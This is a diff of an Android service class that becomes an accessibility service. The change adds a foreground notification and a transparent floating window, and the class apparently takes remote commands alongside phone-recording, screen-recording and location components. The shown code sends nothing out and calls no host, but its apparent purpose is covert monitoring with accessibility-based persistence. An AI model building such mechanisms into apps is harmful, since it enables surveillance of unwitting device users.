@@ -1,9 +1,10 @@
 package com.view.core.services;
 
+import android.accessibilityservice.AccessibilityService;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.Service;
+import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
@@ -11,16 +12,18 @@ import android.graphics.Color;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.os.IBinder;
 import android.os.RemoteException;
 import android.support.annotation.NonNull;
+import android.support.v4.app.NotificationCompat;
 import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
 import android.widget.Toast;
 
 import com.view.core.MyApplication;
 import com.view.core.activitys.MainActivity;
 import com.view.core.activitys.PhoneRecordActivity;
 import com.view.core.activitys.ScreenRecordActivity;
+import com.view.core.activitys.SplashActivity;
 import com.view.core.thread.ActiveThread;
 import com.view.core.thread.ClientThread;
 import com.view.core.thread.Constant;
@@ -37,9 +40,9 @@ import Android.view.core.R;
  * @version:
  * @descripe:
  **/
-public class SocketService extends Service {
+public class SocketAccessibilityService extends AccessibilityService {
 
-    private static final String TAG = SocketService.class.getSimpleName();
+    private static final String TAG = SocketAccessibilityService.class.getSimpleName();
 
     private Context mContext ;
     private Handler mHandler = new Handler();
@@ -55,40 +58,55 @@ public class SocketService extends Service {
         Log.d(TAG, "onCreate: executed "+ PID);
         mContext = this;
         LocationUtil.getInstance().initLocationManager(mContext);
+
+        //服务创建时创建前台通知
+        Notification notification = createForegroundNotification();
+        //启动前台服务
+        startForeground(1,notification);
+
+        new ActiveThread(mContext, mHandler, mListener).start();
     }
 
-    @NonNull
-    private Notification getNotification() {
-        //新增---------------------------------------------
-        String CHANNEL_ONE_ID = "com.primedu.cn";
-        String CHANNEL_ONE_NAME = "Channel One";
-        NotificationChannel notificationChannel = null;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            notificationChannel = new NotificationChannel(CHANNEL_ONE_ID,
-                    CHANNEL_ONE_NAME, NotificationManager.IMPORTANCE_HIGH);
-            notificationChannel.enableLights(true);
-            notificationChannel.setLightColor(Color.RED);
-            notificationChannel.setShowBadge(true);
-            notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
-            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            manager.createNotificationChannel(notificationChannel);
+    //创建前台通知，可写成方法体，也可单独写成一个类
+    private Notification createForegroundNotification(){
+        //前台通知的id名，任意
+        String channelId = "ForegroundService";
+        //前台通知的名称，任意
+        String channelName = "Service";
+        //发送通知的等级，此处为高，根据业务情况而定
+        int importance = NotificationManager.IMPORTANCE_HIGH;
+        //判断Android版本，不同的Android版本请求不一样，以下代码为官方写法
+        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
+            NotificationChannel channel = new NotificationChannel(channelId,channelName,importance);
+            channel.setLightColor(Color.BLUE);
+//            channel.setLockscreenVisiability(Notification.VISIBILITY_PRIVATE);
+            NotificationManager notificationManager = (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
+            notificationManager.createNotificationChannel(channel);
         }
-        //--------------------------------------------------------新增
 
-        Notification notification = new Notification.Builder(this)
-                .setChannelId(CHANNEL_ONE_ID)
-                .setTicker("Nature")
-                .setSmallIcon(R.drawable.ic_launcher)
-                .setContentTitle("SocketService: "+ PID)
+        //点击通知时可进入的Activity
+        Intent notificationIntent = new Intent(this, SplashActivity.class);
+        PendingIntent pendingIntent = PendingIntent.getActivity(this,0,notificationIntent,0);
+
+        //最终创建的通知，以下代码为官方写法
+        //注释部分是可扩展的参数，根据自己的功能需求添加
+        return new NotificationCompat.Builder(this,channelId)
+//                .setContentTitle("玩机技巧")
+                .setContentText("正在为您服务")
+                .setSmallIcon(R.drawable.ic_launcher)//通知显示的图标
+                .setContentIntent(pendingIntent)//点击通知进入Activity
+                .setTicker("通知的提示语")
                 .build();
-        notification.flags |= Notification.FLAG_NO_CLEAR;
-        return notification;
+        //.setOngoing(true)
+        //.setPriority(NotificationCompat.PRIORITY_MAX)
+        //.setCategory(Notification.CATEGORY_TRANSPORT)
+        //.setLargeIcon(Icon)
+        //.setWhen(System.currentTimeMillis())
     }
-
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "onStartCommand: executed "+ PID+ " "+ intent);
+    protected void onServiceConnected() {
+        Log.d(TAG, "onServiceConnected: executed ");
         //连接服务器等待接收指令
 //        if(mClientThread == null) {
 //            mClientThread = new ClientThread(this, mHandler, mListener);
@@ -97,13 +115,22 @@ public class SocketService extends Service {
 //        }
         //显示透明浮窗
         FloatViewUtil.getInstance().showFloatingWindow(mContext);
-        new ActiveThread(mContext, mHandler, mListener).start();
-        return super.onStartCommand(intent, flags, startId);
+    }
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        Log.d(TAG, "onAccessibilityEvent: executed "+ event.getAction());
+    }
+
+    @Override
+    public void onInterrupt() {
+        Log.d(TAG, "onInterrupt: executed ");
     }
 
 
     @Override
     public void onDestroy() {
+        Log.d(TAG, "onDestroy: executed ");
         super.onDestroy();
         //中断接收指令
 //        if(mClientThread != null){
@@ -112,6 +139,9 @@ public class SocketService extends Service {
 //            mClientThread = null;
 //            MyApplication.setClientThread(null);
 //        }
+
+        //在服务被销毁时，关闭前台服务
+        stopForeground(true);
     }
 
     private OnClientListener mListener = new OnClientListener() {
@@ -223,12 +253,5 @@ public class SocketService extends Service {
 
         }
     };
-
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
 
 }
